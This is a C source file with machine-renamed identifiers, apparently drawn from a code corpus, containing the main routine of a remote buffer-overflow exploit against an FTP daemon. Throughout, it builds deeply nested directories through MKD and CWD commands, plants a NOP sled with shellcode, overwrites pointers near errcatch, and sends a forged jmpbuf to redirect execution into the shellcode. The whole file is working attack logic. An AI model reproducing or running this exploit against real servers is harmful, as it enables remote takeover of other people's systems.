#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
struct TYPE_6__ {int pwdlen; } ;
struct TYPE_5__ {int maxpathlen; int mapped_path; int errcatch; scalar_t__ pad_eax; } ;
struct TYPE_4__ {char* rev; char* user; char* pass; int dirlen; } ;

/* Variables and functions */
 int debug ; 
 int disp ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 () ; 
 TYPE_3__ hostinf ; 
 char* FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 char* shellcode ; 
 TYPE_2__* sptr ; 
 int /*<<< orphan*/  FUNC8 (char*,char*) ; 
 int FUNC9 (char*) ; 
 scalar_t__ FUNC10 (char*,char*,int) ; 
 TYPE_1__ tesopt ; 

int
FUNC11 (void)
{
    int shelloff,
        times,
        fill;
    int start_writing_to_errcatch,
        argvlen,
        behind_errcatch;
    int i, n;
    char string[2048];

    argvlen = FUNC9 ("ftpd: ");
    argvlen += FUNC9 (tesopt.rev);
    argvlen += FUNC9 (": ");
    argvlen += FUNC9 (tesopt.user);
    argvlen += FUNC9 (": ");

    if (FUNC10 ("anonymous", tesopt.user, 9) == 0)
        argvlen += FUNC9 (tesopt.pass) + 1;

    times = (sptr->maxpathlen-hostinf.pwdlen) / (tesopt.dirlen + 1);

    fill = sptr->maxpathlen-hostinf.pwdlen - (tesopt.dirlen + 1) * times;

    if (debug > 0) {
        FUNC6 ("CWD %d + (dirlen %d * %d times) + fill %d = %d\n", 
                hostinf.pwdlen, tesopt.dirlen, times, fill, sptr->maxpathlen);
    }

    if (FUNC9 (shellcode) > (tesopt.dirlen - 40))
        FUNC0(0, "shellcode too big, edit the source to use less padding,"
                "\nhmm.. this shouldn't have happened with LaM3rZ shellcode!");

    /* let's try to hit the middle of our 0x90 pad */
    shelloff = sptr->mapped_path + hostinf.pwdlen 
                            + ( (tesopt.dirlen - FUNC9(shellcode)) / 2);

    if (debug > 0)
        FUNC6 ("will try to longjmp to 0x%x\n", shelloff);

    start_writing_to_errcatch = sptr->errcatch - argvlen;
    behind_errcatch = sptr->errcatch + (6 * 4) + 2 + 8;

    if (debug > 0) {
        FUNC6 ("errcatch(0x%x) - argvlen(%d) = start 0x%x - end 0x%x\n", 
                sptr->errcatch, argvlen, start_writing_to_errcatch, behind_errcatch);
    }

    FUNC5 (string, 'A', tesopt.dirlen);

    if (debug<3) /* 0x0e/^N in shellcode -> not meant for humans. */
        disp = 0;
    for (i = 0; i < times; i++) {
            switch (i) {
            case 0: FUNC5 (string, 0x90, tesopt.dirlen);
                    FUNC4 (string+tesopt.dirlen-FUNC9(shellcode), 
                            shellcode, FUNC9 (shellcode)); 
                    break;
            case 1: FUNC5 (string, 0x90, tesopt.dirlen); break;
            default:
                    break;
            }

            string[tesopt.dirlen] = 0;
            FUNC7 ("MKD %s\n", string);
            FUNC1 ();

            FUNC7 ("CWD %s\n", string);
            FUNC1 ();
    }

    FUNC2 ();
    disp = 1;

    if (debug > 0)
        FUNC6 ("Now %d bytes deep in dir structure.\n", hostinf.pwdlen);

    if (fill != sptr->maxpathlen-hostinf.pwdlen)
        FUNC0 (0, "Calculation wrong. Error!");

    if (fill > 506)
        FUNC0 (0, "Aw.. fuck! My fill is waaaay to big!\n");

    /* onefile[0], onefile[1] and maybe pad_eax */
    fill += sptr->pad_eax ? 12 : 8;

    n = fill/4;
    string[0] = 0;
    for (i=0; i < n; i++)
        FUNC8(string, FUNC3(start_writing_to_errcatch));
    for (i=1; i < (fill - (n*4)); i++)
        FUNC8(string, "A");

    /* mapped_path + currentpwdlen + / + 3*4 -> should be pointer to errcatch */
    FUNC8 (string, FUNC3 (sptr->mapped_path+hostinf.pwdlen+13)); /* Argv */
    FUNC8 (string, FUNC3 (behind_errcatch)); /* LastArgv */

    if (debug > 0)
            FUNC6 ("Sending final CWD\n");

    if (FUNC9 (string) < 20)
    FUNC0 (0, "cwd string too short.. check for 0x0's.\n");

    FUNC7 ("CWD %s\n", string);
    FUNC1 ();

/************ jmpbuf ***********/

    if (debug > 0)
            FUNC6 ("Sending jmpbuf\n");

    string[0] = 0;
    for (i=0; i<8; i++) /* (sizeof(jmpbuf) = 24)+8.. */
        FUNC8 (string, FUNC3 (shelloff));

    if (FUNC9 (string) != 32)
            FUNC0 (0, "jmpbuf string too short.. check for 0x0's.\n");

    FUNC7 ("%s\n", string);

    FUNC1 ();

    return (1);
}